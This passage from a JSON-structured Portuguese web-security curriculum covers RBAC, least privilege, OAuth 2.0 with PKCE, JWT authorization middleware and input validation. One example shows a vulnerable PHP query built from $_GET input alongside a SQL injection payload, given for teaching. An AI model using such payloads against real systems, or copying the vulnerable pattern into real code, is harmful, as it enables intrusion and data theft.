                                    "Implemente respostas de erro padronizadas (ex: {error: 'Insufficient permissions'}).",
                                    "Monitore logs e adicione unit tests para middlewares."
                                  ],
                                  "verification": "Execute suíte de testes: acessos permitidos OK (200), negados 403; sem vazamentos de dados.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "Postman/Insomnia",
                                    "Jest/Supertest para testes",
                                    "Tokens JWT gerados"
                                  ],
                                  "tips": "Use decorators em NestJS ou apply() em Express para rotas agrupadas.",
                                  "learningObjective": "Integrar RBAC em fluxos de API reais e validar segurança end-to-end.",
                                  "commonMistakes": [
                                    "Aplicar middleware após rota (ordem errada)",
                                    "Expor dados sensíveis em erros",
                                    "Não testar cenários de role ausente"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um blog API: 'admin' tem 'delete:posts', 'user' tem 'write:posts', 'guest' só 'read:posts'. Middleware bloqueia DELETE /posts/1 para 'user', permitindo só para 'admin'.",
                              "finalVerifications": [
                                "Todas rotas sensíveis protegidas retornam 403 para roles inadequadas.",
                                "Queries de roles/permissões executam em <100ms com dados reais.",
                                "Usuários com múltiplas roles herdam permissões corretamente.",
                                "Logs registram todas tentativas de acesso negado com user_id e role solicitada.",
                                "Testes unitários cobrem 90% dos middlewares com mocks.",
                                "Não há vazamento de dados sensíveis em respostas de erro."
                              ],
                              "assessmentCriteria": [
                                "Estrutura de DB normalizada sem redundâncias (pontos: 20%).",
                                "Middlewares reutilizáveis e eficientes (pontos: 25%).",
                                "Integração correta com autenticação JWT (pontos: 20%).",
                                "Cobertura de testes end-to-end (pontos: 20%).",
                                "Tratamento de erros e logging adequados (pontos: 10%).",
                                "Escalabilidade para novos roles/perms (pontos: 5%)."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Modelagem relacional e queries JOIN.",
                                "Desenvolvimento Web: Middlewares em frameworks como Express/NestJS.",
                                "Segurança da Informação: Princípios de least privilege e defense in depth.",
                                "Testes de Software: Unit/integration tests com mocks.",
                                "Administração de Sistemas: Gerenciamento de usuários e auditoria."
                              ],
                              "realWorldApplication": "Em plataformas como bancos online (acesso a transações só para 'gerente'), e-commerces (edição de produtos só 'admin'), ou SaaS (dashboards por tenant role), RBAC previne breaches como o da Equifax, garantindo conformidade com GDPR/SOC2."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.2.2",
                            "name": "Aplicar Princípio do Menor Privilégio",
                            "description": "Configurar permissões granulares por recurso, auditando acessos e usando just-in-time privileges, evitando superusuários desnecessários em aplicações web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Princípio do Menor Privilégio",
                                  "subSteps": [
                                    "Estude a definição: conceder apenas as permissões mínimas necessárias para realizar tarefas específicas.",
                                    "Analise exemplos de violações, como superusuários com acesso total em produção.",
                                    "Revise princípios relacionados: Zero Trust e Defense in Depth.",
                                    "Identifique benefícios: redução de superfície de ataque e conformidade regulatória.",
                                    "Discuta cenários reais de brechas causadas por privilégios excessivos."
                                  ],
                                  "verification": "Resuma o princípio em suas próprias palavras e liste 3 exemplos de aplicação em apps web.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação OWASP sobre Least Privilege",
                                    "Artigo NIST SP 800-53 sobre controle de acesso"
                                  ],
                                  "tips": "Use analogias cotidianas, como chaves de portas em um prédio, para fixar o conceito.",
                                  "learningObjective": "Explicar o princípio e seus impactos na segurança de aplicações web.",
                                  "commonMistakes": [
                                    "Confundir com autenticação",
                                    "Subestimar riscos de superusuários em desenvolvimento"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Recursos, Usuários e Papéis Necessários",
                                  "subSteps": [
                                    "Liste todos os recursos da aplicação (ex: usuários, posts, configurações).",
                                    "Identifique usuários/papéis (ex: admin, editor, viewer).",
                                    "Defina ações permitidas por papel (CRUD por recurso).",
                                    "Crie um diagrama de matriz de permissões (papel x recurso x ação).",
                                    "Valide com stakeholders para garantir cobertura completa."
                                  ],
                                  "verification": "Apresente uma matriz de permissões completa e sem sobreposições desnecessárias.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramenta de diagramação como Draw.io",
                                    "Exemplo de app web simples (código fonte)"
                                  ],
                                  "tips": "Comece com o mais crítico: recursos sensíveis como dados de usuários.",
                                  "learningObjective": "Criar um mapeamento granular de acessos para evitar privilégios excessivos.",
                                  "commonMistakes": [
                                    "Ignorar recursos ocultos como logs",
                                    "Definir papéis muito amplos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Permissões Granulares por Recurso",
                                  "subSteps": [
                                    "Escolha um framework de autorização (ex: Spring Security, Casbin).",
                                    "Implemente RBAC/ABAC para permissões por recurso e ação.",
                                    "Configure políticas: negue por padrão e permita explicitamente.",
                                    "Evite superusuários: use papéis compostos apenas quando essencial.",
                                    "Integre com o código da aplicação (middlewares, guards)."
                                  ],
                                  "verification": "Execute testes unitários confirmando que acessos são negados quando não autorizados.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Código fonte de uma app web de exemplo",
                                    "Documentação do framework escolhido"
                                  ],
                                  "tips": "Use atributos dinâmicos para ABAC em cenários complexos.",
                                  "learningObjective": "Implementar configurações de permissões mínimas e granulares.",
                                  "commonMistakes": [
                                    "Permitir acesso total por conveniência",
                                    "Não testar cenários de borda"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Auditoria de Acessos e Just-in-Time Privileges",
                                  "subSteps": [
                                    "Configure logs de auditoria para todos os acessos (quem, o quê, quando).",
                                    "Integre ferramentas de logging (ex: ELK Stack, CloudWatch).",
                                    "Implemente JIT: elevação temporária de privilégios via aprovação.",
                                    "Defina políticas de expiração automática de privilégios elevados.",
                                    "Teste fluxos de auditoria e JIT em cenários simulados."
                                  ],
                                  "verification": "Gere relatórios de logs mostrando acessos auditados e JIT expirados corretamente.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Biblioteca de logging compatível",
                                    "Serviço de monitoramento mock"
                                  ],
                                  "tips": "Mantenha logs imutáveis e criptografados para conformidade.",
                                  "learningObjective": "Garantir rastreabilidade e privilégios temporários para maior segurança.",
                                  "commonMistakes": [
                                    "Logs insuficientes para reconstruir incidentes",
                                    "JIT sem timeout"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Validar e Monitorar a Implementação",
                                  "subSteps": [
                                    "Realize testes de penetração simulados para acessos indevidos.",
                                    "Audite configurações em busca de privilégios excessivos.",
                                    "Configure alertas para anomalias de acesso.",
                                    "Documente políticas e treine usuários sobre novos fluxos.",
                                    "Planeje revisões periódicas de permissões."
                                  ],
                                  "verification": "Relatório de testes mostrando 100% de conformidade com least privilege.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de teste como Postman, OWASP ZAP"
                                  ],
                                  "tips": "Automatize testes de autorização no CI/CD pipeline.",
                                  "learningObjective": "Validar e manter a aplicação segura contra violações de privilégios.",
                                  "commonMistakes": [
                                    "Pular testes em produção",
                                    "Não revisar periodicamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um blog web: configure 'viewer' para só ler posts, 'editor' para editar próprios posts, 'admin' para aprovar posts (sem deletar usuários). Use JIT para admin deletar um post sensível, auditando o acesso que expira em 30min.",
                              "finalVerifications": [
                                "Nenhum papel tem acesso desnecessário a recursos.",
                                "Todos acessos são auditados com logs completos.",
                                "Privilégios JIT são elevados e revogados automaticamente.",
                                "Testes confirmam negação de ações não autorizadas.",
                                "Matriz de permissões está documentada e atualizada.",
                                "Ausência de superusuários em ambientes de produção."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração granular (sem over-privileging).",
                                "Cobertura completa de auditoria em todos acessos.",
                                "Funcionalidade JIT testada e segura.",
                                "Qualidade dos testes e verificações.",
                                "Documentação clara de políticas e matrizes.",
                                "Integração seamless com a aplicação web."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD para testes automáticos de autorização.",
                                "Gestão de Compliance: Alinhamento com GDPR/SOX via auditoria.",
                                "Desenvolvimento Ágil: Revisões iterativas de permissões em sprints.",
                                "Análise de Dados: Uso de logs para detecção de ameaças via ML."
                              ],
                              "realWorldApplication": "Em bancos online, caixas acessam apenas saldos de clientes atribuídos, com JIT para transferências altas aprovado por gerente, auditado para prevenir fraudes internas como no caso Equifax breach."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.2.3",
                            "name": "Integrar OAuth 2.0 para autorização delegada",
                            "description": "Configurar fluxos OAuth 2.0 (Authorization Code com PKCE) para terceiros acessarem recursos em nome do usuário, utilizando provedores como Google ou Auth0 em apps para Internet.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Aplicativo no Provedor OAuth",
                                  "subSteps": [
                                    "Escolha um provedor como Google ou Auth0 e acesse o console de desenvolvedor.",
                                    "Crie um novo projeto/aplicativo e registre o client_id e client_secret (para backend).",
                                    "Configure os redirect URIs autorizados (ex: http://localhost:3000/callback).",
                                    "Defina scopes necessários (ex: openid, email, profile).",
                                    "Ative PKCE se suportado e anote as configurações."
                                  ],
                                  "verification": "Verifique no console do provedor se o app está registrado com URIs corretos e scopes aprovados.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "Documentação OAuth do provedor (ex: https://developers.google.com/identity/protocols/oauth2)",
                                    "Conta de desenvolvedor no Google/Auth0"
                                  ],
                                  "tips": "Use URIs HTTPS em produção; teste com localhost em desenvolvimento.",
                                  "learningObjective": "Compreender a configuração inicial de um cliente OAuth para fluxos seguros.",
                                  "commonMistakes": [
                                    "Esquecer de adicionar redirect URI exato, causando erro invalid_redirect_uri.",
                                    "Não habilitar PKCE, expondo a riscos de interceptação de code."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Geração de Code Verifier e Challenge (PKCE)",
                                  "subSteps": [
                                    "Gere um code_verifier aleatório de 43-128 caracteres (base64url-safe).",
                                    "Calcule code_challenge = SHA256(code_verifier) em base64url sem padding.",
                                    "Armazene o code_verifier de forma segura no sessionStorage ou cookie HttpOnly.",
                                    "Inclua code_challenge e code_challenge_method=S256 nos parâmetros de autorização.",
                                    "Teste a geração com uma ferramenta como OpenSSL ou biblioteca crypto."
                                  ],
                                  "verification": "Execute um script de teste que gera challenge e verifica se verifier produz o mesmo challenge.",
                                  "estimatedTime": "45-60 minutos",
                                  "materials": [
                                    "Bibliotecas: crypto-js (JS) ou crypto (Node.js)",
                                    "Documentação PKCE: https://datatracker.ietf.org/doc/html/rfc7636"
                                  ],
                                  "tips": "Use bibliotecas prontas como @auth0/auth0-spa-js para evitar erros criptográficos.",
                                  "learningObjective": "Dominar PKCE para proteger o fluxo Authorization Code em apps single-page.",
                                  "commonMistakes": [
                                    "Usar padding incorreto no base64url, invalidando o challenge.",
                                    "Expor code_verifier em localStorage acessível via XSS."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Iniciar o Fluxo de Autorização e Lidar com Callback",
                                  "subSteps": [
                                    "Construa a URL de autorização: /authorize?client_id=...&redirect_uri=...&scope=...&code_challenge=...&response_type=code.",
                                    "Redirecione o usuário para essa URL ao clicar em 'Conectar com Google'.",
                                    "No callback, extraia code e state da query string.",
                                    "Valide state para prevenir CSRF.",
                                    "Redirecione para página de sucesso ou prossiga para troca de token."
                                  ],
                                  "verification": "Simule o redirecionamento e confirme que retorna com code válido após consentimento.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Exemplo de URL: https://accounts.google.com/o/oauth2/v2/auth",
                                    "Biblioteca: oidc-client-js ou auth0.js"
                                  ],
                                  "tips": "Sempre inclua state=random para CSRF protection.",
                                  "learningObjective": "Implementar o frontend do fluxo OAuth com redirecionamento seguro.",
                                  "commonMistakes": [
                                    "Não validar state, permitindo ataques CSRF.",
                                    "Ignorar erros de consentimento do usuário."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Trocar Code por Access Token no Backend",
                                  "subSteps": [
                                    "Envie POST para /token endpoint com grant_type=authorization_code, code, redirect_uri, client_id/secret, code_verifier.",
                                    "Valide o response: access_token, id_token, refresh_token.",
                                    "Armazene tokens de forma segura (ex: JWT em HttpOnly cookie).",
                                    "Implemente validação de token usando introspection ou JWKS.",
                                    "Trate erros como invalid_grant ou code_used."
                                  ],
                                  "verification": "Use curl ou Postman para testar /token e confirme tokens válidos.",
                                  "estimatedTime": "1-1.5 horas",
                                  "materials": [
                                    "Endpoint /token: https://oauth2.googleapis.com/token",
                                    "Biblioteca backend: passport-oauth2 (Node), spring-security-oauth (Java)"
                                  ],
                                  "tips": "Nunca exponha client_secret no frontend; use backend proxy.",
                                  "learningObjective": "Gerenciar a troca segura de code por tokens com PKCE.",
                                  "commonMistakes": [
                                    "Enviar code_verifier incorreto, falhando na verificação PKCE.",
                                    "Armazenar tokens em locais inseguros como localStorage."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Usar Token para Acessar Recursos e Refresh",
                                  "subSteps": [
                                    "Inclua Authorization: Bearer <access_token> em requests para APIs protegidas.",
                                    "Verifique expiração e use refresh_token para obter novo access_token.",
                                    "Implemente logout revogando tokens via /revoke endpoint.",
                                    "Monitore erros 401 e reautentique automaticamente.",
                                    "Teste end-to-end com ferramentas como OAuth Playground."
                                  ],
                                  "verification": "Acesse um recurso protegido (ex: Google API) e confirme dados retornados.",
                                  "estimatedTime": "45-60 minutos",
                                  "materials": [
                                    "Google APIs Explorer: https://developers.google.com/apis-explorer",
                                    "Documentação refresh: https://developers.google.com/identity/protocols/oauth2"
                                  ],
                                  "tips": "Use middleware para auto-refresh em frameworks como Express.",
                                  "learningObjective": "Integrar tokens OAuth em chamadas API reais com gerenciamento de lifecycle.",
                                  "commonMistakes": [
                                    "Não refrescar tokens expirados, causando falhas 401.",
                                    "Esquecer de revogar em logout, deixando sessões órfãs."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação web de gerenciamento de tarefas, integre OAuth 2.0 com Google para permitir que usuários autorizem acesso à sua agenda Google Calendar. Após login, a app lista eventos e cria novos sem que o usuário digite senha Google.",
                              "finalVerifications": [
                                "Usuário autoriza sem expor credenciais diretamente à app.",
                                "Tokens são obtidos via PKCE sem erros de validação.",
                                "API protegida responde corretamente com dados do usuário.",
                                "Refresh token renova access_token expirado automaticamente.",
                                "Logout revoga tokens e limpa sessão local.",
                                "Nenhum erro de segurança como code leakage detectado em logs."
                              ],
                              "assessmentCriteria": [
                                "Implementação completa de PKCE com code_challenge_method=S256.",
                                "Separação correta de client-side (auth) e server-side (token exchange).",
                                "Tratamento robusto de erros OAuth (invalid_request, access_denied).",
                                "Uso seguro de tokens (HttpOnly cookies, validação JWT).",
                                "Testes end-to-end com cenários de falha e sucesso.",
                                "Documentação de endpoints e fluxos configurados."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Uso de SHA-256 e base64url em PKCE.",
                                "Arquitetura de Software: Padrões client-server e API REST.",
                                "Segurança de Redes: Prevenção de CSRF, XSS e token leakage.",
                                "Desenvolvimento Web: Integração frontend-backend com SPA.",
                                "Ética e Privacidade: Delegação de autorização respeitando consentimento."
                              ],
                              "realWorldApplication": "Plataformas como Spotify, GitHub e Slack usam OAuth 2.0 com PKCE para permitir integrações seguras, como conectar contas sociais ou acessar repositórios sem compartilhar senhas, garantindo conformidade com GDPR e escalabilidade em milhões de usuários."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.2.4",
                            "name": "Verificar autorizações em APIs com middleware",
                            "description": "Desenvolver middlewares que decodifiquem tokens e chequem escopos/permissões contra políticas definidas, logando tentativas de acesso negado para monitoramento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente e middleware base para autenticação",
                                  "subSteps": [
                                    "Instale dependências necessárias como jsonwebtoken, express e um logger como winston.",
                                    "Crie uma estrutura básica de middleware no Express.js usando app.use().",
                                    "Defina políticas de autorização simples em um objeto ou arquivo de configuração (ex: { 'admin': ['read', 'write'], 'user': ['read'] }).",
                                    "Extraia o token do header Authorization da requisição.",
                                    "Valide se o token existe e está no formato Bearer."
                                  ],
                                  "verification": "Execute uma requisição sem token e confirme que o middleware intercepta corretamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Node.js",
                                    "Express.js",
                                    "jsonwebtoken (npm)",
                                    "winston (npm para logging)"
                                  ],
                                  "tips": "Use process.env.JWT_SECRET para armazenar a chave secreta de forma segura.",
                                  "learningObjective": "Configurar um middleware inicial capaz de interceptar e processar headers de autorização.",
                                  "commonMistakes": [
                                    "Esquecer de instalar dependências",
                                    "Não validar formato Bearer",
                                    "Expor chaves secretas no código"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar decodificação e validação do token JWT",
                                  "subSteps": [
                                    "Use jwt.verify() para decodificar o token com a chave secreta.",
                                    "Capture erros comuns como token expirado ou inválido usando try-catch.",
                                    "Extraia claims do payload: userId, roles e scopes.",
                                    "Defina um objeto req.user com os dados decodificados para uso downstream.",
                                    "Retorne erro 401 se a decodificação falhar."
                                  ],
                                  "verification": "Teste com token válido e inválido; verifique se req.user é populado corretamente nos logs.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "jsonwebtoken docs",
                                    "Postman para testes de API"
                                  ],
                                  "tips": "Configure opções no jwt.verify() como { algorithms: ['HS256'] } para segurança.",
                                  "learningObjective": "Decodificar tokens JWT de forma segura e populá-los no contexto da requisição.",
                                  "commonMistakes": [
                                    "Não usar try-catch para erros JWT",
                                    "Ignorar expiração do token",
                                    "Expor payload sem verificação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Verificar escopos e permissões contra políticas definidas",
                                  "subSteps": [
                                    "Acesse as políticas de autorização de um arquivo config/permissions.js.",
                                    "Compare scopes do token com os requeridos pela rota (ex: via req.requiredScopes).",
                                    "Implemente lógica de checagem: intersection de arrays ou função hasScope().",
                                    "Defina middlewares parametrizados como authorize(['read', 'admin']).",
                                    "Passe para o próximo middleware se autorizado."
                                  ],
                                  "verification": "Crie rotas com scopes diferentes e teste acessos permitidos/negados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Arquivo de políticas JSON",
                                    "Exemplos de scopes OAuth2"
                                  ],
                                  "tips": "Use lodash.intersection para checar scopes eficientemente.",
                                  "learningObjective": "Implementar verificação flexível de permissões baseada em políticas.",
                                  "commonMistakes": [
                                    "Checagem case-sensitive sem normalização",
                                    "Não considerar hierarquias de roles",
                                    "Lógica invertida de permissão"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Logar tentativas de acesso negado e responder adequadamente",
                                  "subSteps": [
                                    "Configure um logger (winston) com níveis error e info.",
                                    "No caso de falha, logue: IP, userId (se disponível), endpoint, scopes requeridos e motivo.",
                                    "Responda com status 403 Forbidden e mensagem JSON padronizada.",
                                    "Integre o middleware completo em rotas protegidas.",
                                    "Adicione rate limiting opcional para abusos."
                                  ],
                                  "verification": "Simule acessos negados e cheque logs para detalhes completos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "winston npm",
                                    "Express-rate-limit (opcional)"
                                  ],
                                  "tips": "Mascare dados sensíveis nos logs para compliance GDPR.",
                                  "learningObjective": "Registrar auditoria de acessos para monitoramento e conformidade.",
                                  "commonMistakes": [
                                    "Logs vazios ou sem contexto",
                                    "Responder com 401 em vez de 403",
                                    "Expor detalhes sensíveis nos logs"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e integrar o middleware em uma API completa",
                                  "subSteps": [
                                    "Crie rotas de teste: /users (user scope), /admin/users (admin scope).",
                                    "Gere tokens de teste com diferentes scopes usando jwt.sign().",
                                    "Use Postman ou Jest para testes automatizados de cenários positivos/negativos.",
                                    "Monitore logs em tempo real com ferramentas como pm2-logrotate.",
                                    "Refatore para middleware reutilizável em múltiplas rotas."
                                  ],
                                  "verification": "Todos os testes passam: acessos autorizados prosseguem, negados logam e rejeitam.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Postman Collection",
                                    "Jest ou Supertest para unit tests"
                                  ],
                                  "tips": "Escreva testes primeiro (TDD) para garantir robustez.",
                                  "learningObjective": "Validar a implementação end-to-end em um contexto real de API.",
                                  "commonMistakes": [
                                    "Testes incompletos sem cenários de falha",
                                    "Não testar expirados/revogados",
                                    "Middleware não chainable"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API de e-commerce, proteja a rota POST /admin/products para permitir apenas admins com scope 'write:products'. Um usuário com token 'read:products' terá acesso negado, logado com IP, timestamp e motivo para auditoria de segurança.",
                              "finalVerifications": [
                                "Middleware decodifica token válido e popula req.user.",
                                "Rejeita tokens inválidos/expirados com 401.",
                                "Autoriza corretamente baseado em scopes vs. políticas.",
                                "Loga todos acessos negados com detalhes auditáveis.",
                                "Integra sem quebrar rotas públicas.",
                                "Testes unitários cobrem 100% dos cenários."
                              ],
                              "assessmentCriteria": [
                                "Código modular e reutilizável com middlewares parametrizados.",
                                "Tratamento robusto de erros sem vazamentos de info sensível.",
                                "Logs estruturados e queryáveis (JSON format).",
                                "Conformidade com standards OAuth2/JWT.",
                                "Performance: overhead mínimo (<10ms por req).",
                                "Documentação inline clara para uso."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Princípios de autorização RBAC/ABAC.",
                                "Desenvolvimento de Software: Padrões middleware e chain of responsibility.",
                                "Banco de Dados: Auditoria em logs para queries de segurança.",
                                "Administração de Sistemas: Monitoramento com ELK Stack.",
                                "Ética e Governança: Logging para compliance (LGPD/GDPR)."
                              ],
                              "realWorldApplication": "Em microservices como Netflix ou bancos digitais, middlewares de autorização protegem endpoints sensíveis, previnem brechas de dados e facilitam auditorias regulatórias, reduzindo riscos de ataques como privilege escalation."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.5",
                    "name": "Validação de Entrada e Codificação de Saída",
                    "description": "Práticas para prevenir injeções e ataques de script em aplicações web.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.5.1",
                        "name": "Validação de Entrada",
                        "description": "Processo de verificação e sanitização de dados recebidos de fontes não confiáveis, como formulários web, parâmetros de URL e APIs, para prevenir ataques de injeção como SQL Injection e Command Injection.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.5.1.1",
                            "name": "Identificar fontes de entrada não confiáveis",
                            "description": "Reconhecer entradas de usuário em aplicações web, incluindo campos de formulário, query strings, cookies e headers HTTP, e entender os riscos associados a dados não validados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de entradas de usuário em aplicações web",
                                  "subSteps": [
                                    "Defina o que são entradas de usuário em contextos web.",
                                    "Diferencie entradas controladas (ex.: configurações internas) de não confiáveis (ex.: dados do cliente).",
                                    "Estude o ciclo de vida de uma requisição HTTP: client -> server.",
                                    "Analise exemplos básicos de fluxos de dados em apps web.",
                                    "Registre anotações sobre por que todas as entradas externas são potencialmente maliciosas."
                                  ],
                                  "verification": "Escreva uma definição clara e liste 3 exemplos de entradas controladas vs. não confiáveis.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação HTTP basics (MDN Web Docs)",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Sempre assuma que dados externos são hostis até prova em contrário (princípio de defesa em profundidade).",
                                  "learningObjective": "Entender o conceito fundamental de entradas não confiáveis e sua importância na segurança.",
                                  "commonMistakes": [
                                    "Confundir entradas internas com externas",
                                    "Subestimar dados de fontes 'seguras' como cookies"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar fontes comuns de entradas não confiáveis",
                                  "subSteps": [
                                    "Liste e descreva campos de formulário (POST/GET forms).",
                                    "Examine query strings em URLs (ex.: ?id=123).",
                                    "Investigue cookies (document.cookie ou headers).",
                                    "Analise headers HTTP (User-Agent, Referer, Authorization).",
                                    "Pratique inspecionando uma página web real com DevTools."
                                  ],
                                  "verification": "Crie uma tabela com 4 fontes, exemplos e métodos de captura (ex.: $_POST, $_GET em PHP).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Browser DevTools (F12)",
                                    "Exemplo de site com formulário (ex.: Google search)"
                                  ],
                                  "tips": "Use o Network tab no DevTools para ver headers e payloads reais.",
                                  "learningObjective": "Reconhecer e catalogar as principais fontes de entrada não confiáveis em apps web.",
                                  "commonMistakes": [
                                    "Ignorar headers como fontes",
                                    "Confundir query strings com paths estáticos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar riscos associados a entradas não validadas",
                                  "subSteps": [
                                    "Estude ataques de injeção (SQL, NoSQL) via campos de formulário.",
                                    "Explore XSS via query strings ou headers.",
                                    "Discuta manipulação de cookies para session hijacking.",
                                    "Identifique riscos em headers (ex.: cache poisoning via Referer).",
                                    "Mapeie riscos para cada fonte identificada no step anterior."
                                  ],
                                  "verification": "Para cada fonte, liste 1 risco específico e um exemplo de payload malicioso.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "OWASP Top 10 (Injection, XSS)",
                                    "PortSwigger Web Security Academy (gratuito)"
                                  ],
                                  "tips": "Lembre-se: validação no cliente é só UI; server-side é essencial.",
                                  "learningObjective": "Associar fontes não confiáveis a riscos concretos de segurança.",
                                  "commonMistakes": [
                                    "Focar só em SQLi e ignorar outros vetores",
                                    "Achar que sanitização resolve tudo sem contexto"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar identificação em cenários reais",
                                  "subSteps": [
                                    "Analise código-fonte de um app web simples (ex.: login form).",
                                    "Identifique todas as entradas não confiáveis no código.",
                                    "Simule ataques em um lab seguro (ex.: DVWA).",
                                    "Documente um relatório de fontes e riscos encontrados.",
                                    "Compare com boas práticas (ex.: OWASP cheat sheets)."
                                  ],
                                  "verification": "Submeta um relatório com pelo menos 5 entradas identificadas e seus riscos.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "DVWA ou bWAPP (Docker setup)",
                                    "Editor de código (VS Code)",
                                    "OWASP ZAP para scanning opcional"
                                  ],
                                  "tips": "Comece com apps vulneráveis para ver impactos reais sem risco.",
                                  "learningObjective": "Aplicar o conhecimento para identificar fontes em código e cenários práticos.",
                                  "commonMistakes": [
                                    "Não testar em ambiente isolado",
                                    "Esquecer de logs ou uploads como fontes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um formulário de login PHP: $user = $_GET['username']; $sql = \"SELECT * FROM users WHERE name = '$user'\"; Aqui, query string 'username' é não confiável; attacker usa '?username=admin' OR 1=1-- para SQLi.",
                              "finalVerifications": [
                                "Lista corretamente 4+ fontes não confiáveis com exemplos.",
                                "Explica riscos para cada fonte sem erros conceituais.",
                                "Identifica entradas em um código-fonte fornecido.",
                                "Diferencia validação de sanitização.",
                                "Demonstra uso de DevTools para inspecionar tráfego real.",
                                "Relata pelo menos um cenário de risco real."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de fontes (90%+ corretas).",
                                "Profundidade na análise de riscos (cobre injeção, XSS, etc.).",
                                "Qualidade do relatório prático (claro, estruturado).",
                                "Compreensão de ciclo HTTP (diagrama ou explicação).",
                                "Aplicação em cenários (exemplos originais).",
                                "Evita confusões comuns (ex.: cookies como confiáveis)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender protocolos HTTP/HTTPS.",
                                "Programação Web: Manipulação de $_GET/$_POST em linguagens server-side.",
                                "Ética em TI: Responsabilidade em tratar dados de usuários.",
                                "Banco de Dados: Impacto de injeções em queries."
                              ],
                              "realWorldApplication": "Em desenvolvimento de e-commerces, identificar query strings em filtros de produtos previne SQLi massiva como no breach da Sony (2011); validação de headers bloqueia bots maliciosos em APIs."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.1.2",
                            "name": "Implementar validação baseada em whitelist",
                            "description": "Aplicar regras de validação que aceitam apenas valores esperados (ex.: listas de e-mails válidos, padrões regex para senhas), rejeitando tudo o mais, com exemplos em linguagens como JavaScript e PHP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Validação Baseada em Whitelist",
                                  "subSteps": [
                                    "Defina whitelist como uma lista ou padrão que aceita apenas valores explicitamente permitidos, rejeitando tudo o mais.",
                                    "Compare com blacklist: explique por que whitelist é mais segura (ex.: impossível listar todas ameaças).",
                                    "Identifique cenários comuns: validação de e-mails por domínio, senhas por regex de força, IDs por lista fixa.",
                                    "Estude exemplos iniciais: e-mail deve matching /^user@(exemplo\\.com|parceiro\\.com)$/i.",
                                    "Revise princípios OWASP para validação de entrada."
                                  ],
                                  "verification": "Escreva um parágrafo explicando whitelist vs blacklist e liste 3 vantagens da whitelist.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Documentação OWASP Input Validation",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Sempre priorize simplicidade nas regras para manutenção fácil.",
                                  "learningObjective": "Entender os fundamentos teóricos da validação whitelist e sua superioridade em segurança.",
                                  "commonMistakes": [
